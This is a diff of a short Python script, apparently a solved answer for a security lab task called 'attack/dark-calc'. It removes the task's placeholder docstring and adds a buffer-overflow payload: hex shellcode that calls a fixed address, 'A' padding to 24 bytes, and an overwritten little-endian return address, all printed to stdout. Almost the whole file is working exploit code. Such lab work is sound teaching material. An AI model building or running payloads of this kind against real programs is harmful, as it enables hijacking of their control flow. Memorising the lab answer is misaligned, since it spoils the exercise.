@@ -1,10 +1,12 @@
-#!/usr/bin/env python3
-"""Task 2: build the payload for attack/dark-calc.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
 
-payload = b""
+shellcode = bytes.fromhex(
+    "bf 04 00 00 00 b8 87 1a 40 00 ff d0"
+)
 
-sys.stdout.buffer.write(payload)
+padding = b"A" * (24 - len(shellcode))
+return_address = (0x721000800fd0).to_bytes(8, "little")
+
+payload = shellcode + padding + return_address
+
+sys.stdout.buffer.write(payload + b"\n")
